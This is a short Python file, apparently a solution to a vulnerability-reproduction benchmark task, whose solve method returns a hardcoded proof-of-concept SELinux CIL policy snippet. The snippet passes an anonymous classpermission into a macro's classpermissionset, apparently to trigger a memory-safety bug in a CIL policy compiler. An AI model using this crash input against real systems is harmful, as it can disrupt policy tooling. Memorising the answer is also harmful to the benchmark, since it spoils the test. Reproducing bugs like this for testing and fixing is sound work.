import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""
(class myclass (perm))
(macro m ((cp classpermission))
    (classpermissionset s (cp))
)
(call m (((myclass (perm)))))
"""
        return poc.strip()
